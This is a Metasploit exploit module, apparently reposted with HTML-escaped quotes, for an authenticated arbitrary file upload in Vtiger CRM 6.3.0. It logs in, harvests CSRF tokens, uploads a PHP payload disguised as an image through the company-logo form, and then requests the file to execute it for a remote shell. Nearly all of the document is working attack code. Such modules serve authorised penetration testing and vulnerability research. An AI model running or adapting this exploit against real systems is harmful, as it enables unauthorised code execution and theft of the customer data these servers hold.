# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Vtiger CRM 6.3.0 - Authenticated Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
      Vtiger 6.3.0 CRM&#039;s administration interface allows for the upload of
a company logo.
      Instead of uploading an image, an attacker may choose to upload a
file containing PHP code and
      run this code by accessing the resulting PHP file.
 
      This module was tested against vTiger CRM v6.3.0.
      },
      &#039;Author&#039; =>
        [
            &#039;Benjamin Daniel Mussler&#039;, # Discoverys
        &#039;Touhid M.Shaikh <admin[at]touhidshaikh.com>&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
            [&#039;CVE&#039;, &#039;2015-6000&#039;],
        [&#039;CVE&#039;,&#039;2016-1713&#039;],
            [&#039;EDB&#039;, &#039;38345&#039;]
        ],
       &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039;     => false,
            &#039;Encoder&#039; => &#039;php/base64&#039;
          },
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;vTiger CRM v6.3.0&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 28 2015&#039;))
 
      register_options(
        [
            OptString.new(&#039;TARGETURI&#039;, [ true, "Base vTiger CRM directory
path", &#039;/&#039;]),
            OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate
with", &#039;admin&#039;]),
            OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate
with", &#039;password&#039;])
        ])
 
      # Some PHP version uses php_short_code=ON
      register_advanced_options(
        [
            OptBool.new(&#039;PHPSHORTTAG&#039;, [ false, &#039;Set a short_open_tag
option&#039;, false ])
        ], self.class)
  end
 
  def check
    res = nil
    begin
      res = send_request_cgi({ &#039;uri&#039; => normalize_uri(target_uri.path,
&#039;index.php&#039;) })
    rescue
      vprint_error("Unable to access the index.php file")
      return CheckCode::Unknown
    end
 
    if res and res.code != 200
      vprint_error("Error accessing the index.php file")
      return CheckCode::Unknown
    end
 
    if res.body =~ /<small> Powered by vtiger CRM (.*.0)<\/small>/i
      vprint_status("vTiger CRM version: " + $1)
      case $1
      when &#039;6.3.0&#039;
      return Exploit::CheckCode::Vulnerable
      else
        return CheckCode::Detected
      end
    end
 
    return CheckCode::Safe
  end
 
 
  # Login Function.
  def login
      # Dummy Request for grabbing CSRF token and PHPSESSION ID
      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vhost&#039; => "#{rhost}:#{rport}",
      })
 
      # Grabbing CSRF token from body
      /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine
CSRF token") if csrf.nil?
      vprint_good("CSRF Token for login: #{csrf}")
 
      # Get Login now.
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vars_get&#039; => {
          &#039;module&#039; => &#039;Users&#039;,
          &#039;action&#039; => &#039;Login&#039;,
        },
        &#039;vars_post&#039; => {
        &#039;__vtrftk&#039; => csrf,
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      },
      })
 
    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to
Login request")
    end
 
    if res.code == 302 &&
res.headers[&#039;Location&#039;].include?("index.php?module=Users&parent=Settings&view=SystemSetup")
      vprint_good("Authentication successful:
#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      return res.get_cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed
:[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
      return nil
    end
  end
 
  def exploit
    begin
      cookie = login
      pay_name = rand_text_alpha(rand(5..10)) + ".php"
 
      # Make a payload raw. I added this bcz when i making this module.
server have short_open_tag=ON
      vprint_warning("Payload Generate according to
short_open_tag=#{datastore[&#039;PHPSHORTTAG&#039;]}")
      if datastore[&#039;PHPSHORTTAG&#039;] == true
        stager = &#039;<? &#039;
        stager << payload.encode
        stager << &#039; ?>&#039;
      else
        stager = &#039;<?php &#039;
        stager << payload.encode
        stager << &#039; ?>&#039;
      end
 
 
      # Again request for CSRF_token
      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vhost&#039; => "#{rhost}:#{rport}",
        &#039;cookie&#039; => cookie
      })
 
      # Grabbing CSRF token from body
      /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine
CSRF token") if csrf.nil?
      vprint_good("CSRF Token for Form Upload: #{csrf}")
 
      # Setting Company Form data
      post_data = Rex::MIME::Message.new
      post_data.add_part(csrf, content_type = nil, transfer_encoding = nil,
content_disposition = "form-data; name=\"__vtrftk\"") # CSRF token
      post_data.add_part(&#039;Vtiger&#039;, content_type = nil, transfer_encoding =
nil, content_disposition = "form-data; name=\"module\"")
      post_data.add_part(&#039;Settings&#039;, content_type = nil, transfer_encoding
= nil, content_disposition = "form-data; name=\"parent\"")
      post_data.add_part(&#039;CompanyDetailsSave&#039;, content_type = nil,
transfer_encoding = nil, content_disposition = "form-data; name=\"action\"")
      post_data.add_part(stager, content_type = "image/jpeg",
transfer_encoding = nil, content_disposition = "form-data; name=\"logo\";
filename=\"#{pay_name}\"") #payload Content-type bypass
      post_data.add_part(&#039;vtiger&#039;, content_type = nil, transfer_encoding =
nil, content_disposition = "form-data; name=\"organizationname\"")
      post_data.add_part(&#039;95, 12th Main Road, 3rd Block, Rajajinagar&#039;,
content_type = nil, transfer_encoding = nil, content_disposition =
"form-data; name=\"address\"")
      post_data.add_part(&#039;Bangalore&#039;, content_type = nil, transfer_encoding
= nil, content_disposition = "form-data; name=\"city\"")
      post_data.add_part(&#039;Karnataka&#039;, content_type = nil, transfer_encoding
= nil, content_disposition = "form-data; name=\"state\"")
      post_data.add_part(&#039;560010&#039;, content_type = nil, transfer_encoding =
nil, content_disposition = "form-data; name=\"code\"")
      post_data.add_part(&#039;India&#039;, content_type = nil, transfer_encoding =
nil, content_disposition = "form-data; name=\"country\"")
      post_data.add_part(&#039;+91 9243602352&#039;, content_type = nil,
transfer_encoding = nil, content_disposition = "form-data; name=\"phonxe\"")
      post_data.add_part(&#039;+91 9243602352&#039;, content_type = nil,
transfer_encoding = nil, content_disposition = "form-data; name=\"fax\"")
      post_data.add_part(&#039;www.touhidshaikh.com&#039;, content_type = nil,
transfer_encoding = nil, content_disposition = "form-data;
name=\"website\"")
      post_data.add_part(&#039;1234-5678-9012&#039;, content_type = nil,
transfer_encoding = nil, content_disposition = "form-data; name=\"vatid\"")
      post_data.add_part(&#039; &#039;, content_type = nil, transfer_encoding = nil,
content_disposition = "form-data; name=\"saveButton\"")
      data = post_data.to_s
 
      print_good("Payload ready for upload : [ #{pay_name} ]")
 
      print_status("Uploading payload..")
      # in Company Logo upload our payload.
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vhost&#039; => "#{rhost}:#{rport}",
        &#039;cookie&#039; => cookie,
        &#039;connection&#039; => &#039;close&#039;,
        &#039;headers&#039; => {
          &#039;Referer&#039; => "http://
#{rhost}:#{rport}/index.php?parent=Settings&module=Vtiger&view=CompanyDetails",
          &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
        },
        &#039;data&#039; => data,
        &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
      })
 
      unless res && res.code == 302
        fail_with(Failure::None, "#{peer} - File wasn&#039;t uploaded,
aborting!")
      end
 
      # Cleanup file.
      register_files_for_cleanup(pay_name)
 
      print_status("Executing Payload [
#{rhost}:#{rport}/test/logo/#{pay_name} ]" )
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path, "test", "logo", pay_name)
      })
 
      # If we don&#039;t get a 200 when we request our malicious payload, we
suspect
      # we don&#039;t have a shell, either.
      if res && res.code != 200
        print_error("Unexpected response, probably the exploit failed")
      end
 
      disconnect
    end
  end
end

